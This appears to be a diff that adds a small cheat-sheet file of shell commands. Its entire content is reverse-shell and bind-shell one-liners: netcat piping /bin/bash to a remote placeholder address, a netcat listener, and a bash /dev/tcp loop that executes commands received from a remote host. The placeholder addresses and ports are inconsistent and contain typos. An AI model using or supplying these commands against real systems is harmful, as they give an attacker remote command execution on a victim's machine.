@@ -1,0 +1,6 @@
+nc -c /bin/bash ip.addr.0.1  unfiltered port 
+nc -l -vv port 
+nc -l -p port -vvv
+/bin/bash | nc ip.adder.0.1 unfilteredport
+exec 5<>/dev/tcp/ip.addr.0.1/unfiltered port same as another
+$cat <&5 |while read line; do $line 2>&5 >&5; done
